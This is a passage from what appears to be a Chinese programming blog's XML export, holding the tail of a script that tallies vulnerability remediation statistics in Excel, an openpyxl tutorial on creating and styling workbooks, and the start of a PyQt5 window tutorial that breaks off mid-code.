&apos;=COUNTIFS(H:H,&quot;高&quot;,M:M,T%s)&apos; % i</span><br><span class="line">                        old_ws[&apos;V%s&apos;%i].value = &apos;=COUNTIFS(H:H,&quot;中&quot;,M:M,T%s)&apos; % i</span><br><span class="line">                        old_ws[&apos;W%s&apos;%i].value = &apos;=COUNTIFS(H:H,&quot;高&quot;,M:M,T%s,P:P,&quot;已完成整改&quot;)&apos; % i</span><br><span class="line">                        old_ws[&apos;X%s&apos;%i].value = &apos;=COUNTIFS(H:H,&quot;中&quot;,M:M,T%s,P:P,&quot;已完成整改&quot;)&apos; % i</span><br><span class="line">                        old_ws[&apos;Y%s&apos;%i].value = &apos;=IF(U%s=0,&quot;无高风险漏洞&quot;,TEXT(W%s/U%s,&quot;0.00%%&quot;))&apos; % (i,i,i)</span><br><span class="line">                        old_ws[&apos;Z%s&apos;%i].value = &apos;=IF(V%s=0,&quot;无中风险漏洞&quot;,TEXT(X%s/V%s,&quot;0.00%%&quot;))&apos; % (i,i,i)</span><br><span class="line">                        old_ws[&apos;AA%s&apos;%i].value = &apos;=TEXT((W%s+X%s)/(U%s+V%s),&quot;0.00%%&quot;)&apos; % (i,i,i,i)</span><br><span class="line">                        for line in old_ws[&apos;T%s:AA%s&apos; % (i,i)]:</span><br><span class="line">                            for line_style in line:</span><br><span class="line">                                line_style.border = border</span><br><span class="line">                                line_style.font = font</span><br><span class="line">                                line_style.alignment = alignment</span><br><span class="line">                        break</span><br><span class="line">                    i += 1</span><br><span class="line"></span><br><span class="line">                old_wb.save(old_folder + &apos;/&apos; + old_name.strip(&apos;\n\r&apos;))</span><br><span class="line">                system_name.append(old_name)</span><br><span class="line">                #openpyxl读取公式的值返回None 使用列表代替</span><br><span class="line">                print(&apos;新增高危：%s \t中危：%s  \t&apos; %(len(height_list),len(low_list)) + old_name.strip(&apos;\n\r&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&apos;\n添加漏洞数据失败：&apos;)</span><br><span class="line">for old_name in oldList:</span><br><span class="line">    for name in system_name:</span><br><span class="line">        if old_name == name:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(old_name)</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 回收站 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Excel操作</title>
      <link href="/article/python-excel.html"/>
      <url>/article/python-excel.html</url>
      
        <content type="html"><![CDATA[<h1 id="openpyxl"><a href="#openpyxl" class="headerlink" title="openpyxl"></a>openpyxl</h1><h3 id="创建文件、赋值"><a href="#创建文件、赋值" class="headerlink" title="创建文件、赋值"></a>创建文件、赋值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import openpyxl</span><br><span class="line"></span><br><span class="line">#调用 openpyxl.Workbook() 生成一个 Workbook 的实例化对象</span><br><span class="line">#这个就代表一个工作簿（就是一个 Excel 文件）</span><br><span class="line">wb = openpyxl.Workbook()</span><br><span class="line"></span><br><span class="line"># 获取默认活跃的工作表</span><br><span class="line">ws = wb.active</span><br><span class="line"># 设置工作表名字</span><br><span class="line">ws.title = &apos;漏洞数据&apos;</span><br><span class="line"></span><br><span class="line"># 数据可以直接赋值给单元格</span><br><span class="line">ws[&apos;A1&apos;] = &apos;序号&apos;</span><br><span class="line">ws[&apos;B1&apos;] = &apos;标题&apos;</span><br><span class="line">ws[&apos;C1&apos;] = &apos;内容&apos;</span><br><span class="line">ws[&apos;D1&apos;] = &apos;时间&apos;</span><br><span class="line"></span><br><span class="line"># 可以整行添加，分别在A2、B2、C2单元格</span><br><span class="line">ws.append([1, &apos;北京&apos;, &apos;北京三里墩&apos;])</span><br><span class="line"></span><br><span class="line"># Python 类型将自动转换</span><br><span class="line">ws[&apos;D2&apos;] = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line"># 保存文件</span><br><span class="line">wb.save(&quot;demo.xlsx&quot;)</span><br></pre></td></tr></table></figure><h3 id="读取文件、删除"><a href="#读取文件、删除" class="headerlink" title="读取文件、删除"></a>读取文件、删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import datetime</span><br><span class="line">import openpyxl</span><br><span class="line"></span><br><span class="line">wb = openpyxl.load_workbook(&apos;demo.xlsx&apos;)</span><br><span class="line"></span><br><span class="line"># 创建新的工作表</span><br><span class="line">wb.create_sheet(index = 0, title = &quot;Python&quot;)</span><br><span class="line"></span><br><span class="line"># 删除工作表</span><br><span class="line">wb.remove(wb[&apos;Python&apos;])</span><br><span class="line"># 获取所有工作表</span><br><span class="line">print(wb.sheetnames)</span><br><span class="line"></span><br><span class="line">#获取指定名称的工作表</span><br><span class="line">ws = wb[&apos;Sheet&apos;]</span><br><span class="line">print(ws)</span><br><span class="line"></span><br><span class="line"># 定位单元格</span><br><span class="line"># 获取工作表之后，可以通过像 Python 字典索引那样去定位单元格。</span><br><span class="line"># 单元格对象，拥有 row、column 和 coordinate 属性，代表单元格的行、列和坐标：</span><br><span class="line">num = ws[&apos;C3&apos;]</span><br><span class="line"># 行</span><br><span class="line">print(num.row)</span><br><span class="line"># 列</span><br><span class="line">print(num.column)</span><br><span class="line"># 坐标</span><br><span class="line">print(num.coordinate)</span><br><span class="line"></span><br><span class="line"># 通过 value 属性可以访问该单元格的值</span><br><span class="line">print(ws[&apos;C3&apos;].value)</span><br><span class="line"></span><br><span class="line"># 通过 offset(row, column) 方法，定位距离该单元格 row 行 column 列偏移的另一个单元格</span><br><span class="line">news = num.offset(2,0)</span><br><span class="line">print(news.coordinate)</span><br><span class="line">print(news.value)</span><br><span class="line"></span><br><span class="line">#查看低496列该如何表示</span><br><span class="line">num = openpyxl.cell.cell.get_column_letter(496)</span><br><span class="line">print(num)</span><br><span class="line"></span><br><span class="line"># 编号是 &apos;JB&apos; 查看是多少列</span><br><span class="line">num = openpyxl.cell.cell.column_index_from_string(&apos;JB&apos;)</span><br><span class="line">print(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 访问多个单元格,按行进行迭代</span><br><span class="line">for move in ws[&apos;A2&apos;:&apos;D15&apos;]:</span><br><span class="line">    for cell in move:</span><br><span class="line">        print(cell.value, end=&apos; &apos;)</span><br><span class="line">    print(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"># 通过工作表的 rows 和 columns 属性获取当前工作表下所有行或列的迭代。</span><br><span class="line">for each_row in ws.rows:</span><br><span class="line">    print(each_row[2].value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 如果不想一次性迭代所有的行或列，可以使用 iter_rows() 和 iter_columns() 方法进行控制</span><br><span class="line">#第二行第一列，第四行第二列</span><br><span class="line">for each_row in ws.iter_rows(min_row=2, min_col=1, max_row=4, max_col=2):</span><br><span class="line">    print(each_row[1].value)</span><br><span class="line"></span><br><span class="line"># 拷贝整个工作表，可以使用工作簿对象的 copy_worksheet() 方法</span><br><span class="line">new = wb.copy_worksheet(ws)</span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure><h3 id="工作表颜色"><a href="#工作表颜色" class="headerlink" title="工作表颜色"></a>工作表颜色</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import openpyxl</span><br><span class="line"></span><br><span class="line">wb = openpyxl.Workbook()</span><br><span class="line"># 创建工作表</span><br><span class="line">ws1 = wb.create_sheet(title = &quot;纸条&quot;)</span><br><span class="line">ws2 = wb.create_sheet(title = &quot;小纸条&quot;)</span><br><span class="line">ws2 = wb.create_sheet(title = &quot;Python&quot;)</span><br><span class="line"></span><br><span class="line"># 设置工作表颜色</span><br><span class="line">ws1.sheet_properties.tabColor = &quot;FF0000&quot;</span><br><span class="line">ws2.sheet_properties.tabColor = &quot;00FF00&quot;</span><br><span class="line">ws2.sheet_properties.tabColor = &quot;0000FF&quot;</span><br><span class="line"></span><br><span class="line"># 保存</span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure><h3 id="行高、列宽"><a href="#行高、列宽" class="headerlink" title="行高、列宽"></a>行高、列宽</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import openpyxl</span><br><span class="line"></span><br><span class="line">wb = openpyxl.Workbook()</span><br><span class="line"></span><br><span class="line"># 获取默认活跃的工作表</span><br><span class="line">ws = wb.active</span><br><span class="line"># 设置工作表名字</span><br><span class="line">ws.title = &apos;漏洞数据&apos;</span><br><span class="line"></span><br><span class="line"># 设置第二行行高</span><br><span class="line">ws.row_dimensions[2].height = 100</span><br><span class="line"># 设置C列的宽度</span><br><span class="line">ws.column_dimensions[&apos;C&apos;].width = 50</span><br><span class="line"></span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure><h3 id="合并、拆分单元格"><a href="#合并、拆分单元格" class="headerlink" title="合并、拆分单元格"></a>合并、拆分单元格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import openpyxl</span><br><span class="line"></span><br><span class="line">wb = openpyxl.Workbook()</span><br><span class="line"></span><br><span class="line"># 获取默认活跃的工作表</span><br><span class="line">ws = wb.active</span><br><span class="line"># 设置工作表名字</span><br><span class="line">ws.title = &apos;漏洞数据&apos;</span><br><span class="line"></span><br><span class="line"># 合并单元格</span><br><span class="line">ws.merge_cells(&apos;A1:C3&apos;)</span><br><span class="line">ws[&apos;A1&apos;] = &apos;小纸条&apos;</span><br><span class="line"></span><br><span class="line"># 拆分单元格</span><br><span class="line">ws.unmerge_cells(&apos;A1:C3&apos;)</span><br><span class="line"></span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure><h3 id="冻结、解冻窗口"><a href="#冻结、解冻窗口" class="headerlink" title="冻结、解冻窗口"></a>冻结、解冻窗口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import openpyxl</span><br><span class="line"></span><br><span class="line">wb = openpyxl.load_workbook(&apos;demo.xlsx&apos;)</span><br><span class="line"></span><br><span class="line"># 获取默认活跃的工作表</span><br><span class="line">ws = wb.active</span><br><span class="line"></span><br><span class="line"># 冻结窗口也就是B列，第8行</span><br><span class="line">ws.freeze_panes = &apos;B8&apos;</span><br><span class="line"># 解冻窗口，如果需要解冻，只需要将 freeze_panes 设置为 None 或 &apos;A1&apos; 即可。</span><br><span class="line">ws.freeze_panes = None</span><br><span class="line"></span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><ul><li>name：字体名称</li><li>size：字体尺寸</li><li>bold：True（加粗）/ False（不加粗）</li><li>italic：True（倾斜）/ False（不倾斜）</li><li>vertAlign：’None’（默认）/ ‘superscript’（上标）/ ‘subscript’（下标）</li><li>underline：’None’（默认）/ ‘single’（单下划线）/ ‘double’（双下划线）/ ‘singleAccounting’（会计用单下划线）/ ‘doubleAccounting’（会计用双下划线）</li><li>strike：’True’（显示删除线）/ ‘False’（不显示删除线）</li><li>color：字体的颜色</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from openpyxl import Workbook</span><br><span class="line"># 修改字体需要实例化一个 Font 类</span><br><span class="line">from openpyxl.styles import Font</span><br><span class="line"></span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line">ws.title = &apos;漏洞数据&apos;</span><br><span class="line"></span><br><span class="line">A2 = ws[&apos;A2&apos;]</span><br><span class="line">A2.value = &quot;序号&quot;</span><br><span class="line"># 字体加粗，红颜色</span><br><span class="line">bold_red = Font(bold=True, color=&quot;FF0000&quot;)</span><br><span class="line">A2.font = bold_red</span><br><span class="line"></span><br><span class="line">B2 = ws[&apos;B2&apos;]</span><br><span class="line">B2.value = &quot;漏洞名称&quot;</span><br><span class="line"># 字体倾斜、显示删除线、蓝颜色、大小16</span><br><span class="line">bold_red = Font(italic=True, strike=True, color=&quot;0000FF&quot;, size=16)</span><br><span class="line">B2.font = bold_red</span><br><span class="line"></span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure><h3 id="背景色"><a href="#背景色" class="headerlink" title="背景色"></a>背景色</h3><ul><li>fill_type：填充类型</li><li>fgColor：背景颜色</li><li>填充类型：’solid’（实心填充）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from openpyxl import Workbook</span><br><span class="line"># 填充单元格的背景颜色，可以通过实例化 PatternFill 类来实现</span><br><span class="line">from openpyxl.styles import PatternFill</span><br><span class="line"></span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line">ws.title = &apos;漏洞数据&apos;</span><br><span class="line"></span><br><span class="line">A2 = ws[&apos;A2&apos;]</span><br><span class="line">A2.value = &quot;序号&quot;</span><br><span class="line"># 填充类型为实心填充，绿颜色</span><br><span class="line">background = PatternFill(fill_type=&quot;solid&quot;, fgColor=&quot;008000&quot;)</span><br><span class="line">A2.fill = background</span><br><span class="line"></span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure><h3 id="边框、对齐方式"><a href="#边框、对齐方式" class="headerlink" title="边框、对齐方式"></a>边框、对齐方式</h3><p>实例化 Border 类可以设置单元格的边框：</p><ul><li>left：指定左侧边框线类型和颜色</li><li>right：指定右侧边框线类型和颜色</li><li>top：指定顶端边框线类型和颜色</li><li>bottom：指定低端边框线类型和颜色</li><li>diagonal：指定对角线类型和颜色</li><li>diagonalUp：是否绘制左下角到右上角的对角线</li><li>diagonalDown：是否绘制左上角到右下角的对角线</li><li>diagonal_direction：指定对角线方向</li><li>outline：指定轮廓线类型和颜色</li><li>vertical：指定垂直线类型和颜色</li><li>horizontal：指定水平线类型和颜色</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from openpyxl import Workbook</span><br><span class="line"># 实例化 Border 类可以设置单元格的边框</span><br><span class="line">from openpyxl.styles import Border, Side</span><br><span class="line"># 文本对齐类</span><br><span class="line">from openpyxl.styles import Alignment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line">ws.title = &apos;漏洞数据&apos;</span><br><span class="line"></span><br><span class="line">for content in range(1,17):</span><br><span class="line">    ws.append([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16])</span><br><span class="line"></span><br><span class="line"># 定义一个样式thin,黑颜色</span><br><span class="line">thin = Side(border_style=&quot;thin&quot;, color=&quot;000000&quot;)</span><br><span class="line"># 定义上、下、左、右、的边框</span><br><span class="line">border = Border(left=thin, right=thin, top=thin, bottom=thin)</span><br><span class="line"># 文本左右居中、上下居中、自动换行</span><br><span class="line">alignment = Alignment(horizontal=&apos;center&apos;, vertical=&apos;center&apos;, wrap_text=True)</span><br><span class="line"></span><br><span class="line"># 设置A1到P16的边框</span><br><span class="line">for line in ws[&apos;A1:P16&apos;]:</span><br><span class="line">    for line_style  in line:</span><br><span class="line">        line_style.border = border</span><br><span class="line">        line_style.alignment = alignment</span><br><span class="line"></span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure><h3 id="命名样式"><a href="#命名样式" class="headerlink" title="命名样式"></a>命名样式</h3><p>前面对单元格的每一种样式进行单独赋值，比如要指定 ‘A1’ 单元格的文本对齐和边框，那么就需要进行两次的赋值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws[&apos;A1&apos;].alignment = ...</span><br><span class="line">ws[&apos;A1&apos;].border = ...</span><br></pre></td></tr></table></figure><p>openpyxl 有一个命名样式的功能，也就是设置样式模板。</p><p>使用命名样式只需要四个步骤：</p><ul><li>实例化一个 NamedStyle 类</li><li>初始化命名样式</li><li>注册命名样式到工作簿中</li><li>将单元格的 style 属性赋值为命名样式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from openpyxl import Workbook</span><br><span class="line"># 实例化 Border 类可以设置单元格的边框</span><br><span class="line">from openpyxl.styles import Border, Side</span><br><span class="line"># 文本对齐类</span><br><span class="line">from openpyxl.styles import Alignment</span><br><span class="line"># 命名样式</span><br><span class="line">from openpyxl.styles import NamedStyle</span><br><span class="line"># 字体</span><br><span class="line">from openpyxl.styles import Font</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wb = Workbook()</span><br><span class="line">ws = wb.active</span><br><span class="line">ws.title = &apos;漏洞数据&apos;</span><br><span class="line"></span><br><span class="line">for content in range(1,17):</span><br><span class="line">    ws.append([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16])</span><br><span class="line"></span><br><span class="line">thin = Side(border_style=&quot;thin&quot;, color=&quot;000000&quot;)</span><br><span class="line"></span><br><span class="line">excel_style = NamedStyle(name=&quot;excel_style&quot;)</span><br><span class="line">excel_style.font = Font(bold=True, size=20)</span><br><span class="line">excel_style.border = Border(left=thin, right=thin, top=thin, bottom=thin)</span><br><span class="line">excel_style.alignment = Alignment(horizontal=&apos;center&apos;, vertical=&apos;center&apos;, wrap_text=True)</span><br><span class="line"></span><br><span class="line"># 设置A1到P16的边框</span><br><span class="line">for line in ws[&apos;A1:P16&apos;]:</span><br><span class="line">    for line_style  in line:</span><br><span class="line">        line_style.style = excel_style</span><br><span class="line"></span><br><span class="line">wb.save(&apos;demo.xlsx&apos;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python PyQt5</title>
      <link href="/article/python-pyqt5.html"/>
      <url>/article/python-pyqt5.html</url>
      
        <content type="html"><![CDATA[<p>pyinstaller还不能完全支持pyqt，所以要用develop版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install https://github.com/pyinstaller/pyinstaller/archive/develop.zip</span><br></pre></td></tr></table></figure><h3 id="0、安装"><a href="#0、安装" class="headerlink" title="0、安装"></a>0、安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install PyQt5</span><br><span class="line">pip install PyQt5-tools</span><br></pre></td></tr></table></figure><p>安装后可以在目录下找到设计师。</p><p>转换成Python代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyuic5 -o rsas_stop_ui.py untitled.ui</span><br></pre></td></tr></table></figure><h3 id="1、一个界面"><a href="#1、一个界面" class="headerlink" title="1、一个界面"></a>1、一个界面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5 import QtWidgets,QtGui,QtCore</span><br><span class="line"></span><br><span class="line">class Main(QtWidgets.QWidget):</span><br><span class="line">    #创建一个窗口</span><br><span class="line">    def __init__(self, parent=None):</span><br><span class="line">        QtWidgets.QWidget.__init__(self,parent)</span><br><span class="line">        self.setWindowTitle(&apos;笔记没了，不开心！&apos;)</span><br><span class="line">        #设置窗口的大小</span><br><span class="line">        self.resize(750, 350)</span><br><span class="line">        #固定窗口的大小</span><br><span class="line">        self.setFixedSize(self.width(), self.height())</span><br><span class="line"></span><br><span class="line">        #设置图标</span><br><span class="line">        self.setWindowIcon(QtGui.QIcon(&apos;favicon.ico&apos;))</span><br><span class="line">        #在屏幕中心显示窗口</span><br><span class="line">        self.center()</span><br><span class="line"></span><br><span class="line">    #窗口显示在屏幕中心</span><br><span class="line">    def center(self):</span><br><span class="line">        #获取显示器的分辨率</span><br><span class="line">        screen = QtWidgets.QDesktopWidget().screenGeometry()</span><br><span class="line">        #获取窗体的宽高</span><br><span class="line">        size = self.geometry()</span><br><span class="line">        self.move((screen.width() - size.width())/2, (screen.height() - size.height())/2)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    GUI = QtWidgets.QApplication(sys.argv)</span><br><span class="line">    center = Main()</span><br><span class="line">    center.show()</span><br><span class="line">    sys.exit(GUI.exec_())</span><br></pre></td></tr></table></figure><h3 id="2、固定窗口大小与布局"><a href="#2、固定窗口大小与布局" class="headerlink" title="2、固定窗口大小与布局"></a>2、固定窗口大小与布局</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5 import QtWidgets,QtGui,QtCore</span><br><span class="line"></span><br><span class="line">class Main(QtWidgets.QWidget):</span><br><span class="line">    #创建一个窗口</span><br><span class="line">    def __init__(self, parent=None):</span><br><span class="line">        QtWidgets.QWidget.__init__(self,parent)</span><br><span class="line">        #在屏幕中心显示窗口</span><br><span class="line">        self.center()</span><br><span class="line">        #窗体布局</span><br><span class="line">        self.text()</span><br><span class="line"></span><br><span class="line">    #窗口显示在屏幕中心</span><br><span class="line">    def center(self):</span><br><span class="line">        self.setWindowTitle(&apos;笔记没了，不开心！&apos;)</span><br><span class="line">        #设置窗口的大小并固定</span><br><span class="line">        self.setFixedSize(650, 350)</span><br><span class="line">        #设置图标</span><br><span class="line">        self.setWindowIcon(QtGui.QIcon(&apos;favicon.ico&apos;))</span><br><span class="line"></span><br><span class="line">        #获取显示器的分辨率</span><br><span class="line">        screen = QtWidgets.QDesktopWidget().screenGeometry()</span><br><span class="line">        #获取窗体的宽高</span><br><span class="line">        size = self.geometry()</span><br><span class="line">        self.move((screen.width() - size.width())/2, (screen.height() - size.height())/2)</span><br><span class="line"></span><br><span class="line">    def text(self):</span><br><span class="line">        sure = QtWidgets.QPushButton(&apos;确定&apos;,self)</span><br><span class="line">        sure.move(165,300)</span><br><span class="line"></span><br><span class="line">        cancel = QtWidgets.QPushButton(&apos;取消&apos;,self)</span><br><span class="line">        cancel.move(400,300)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    GUI = QtWidgets.QApplication(sys.argv)</span><br><span class="line">    center = Main()</span><br><span class="line">    center.show()</span><br><span class="line">    sys.exit(GUI.exec_())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 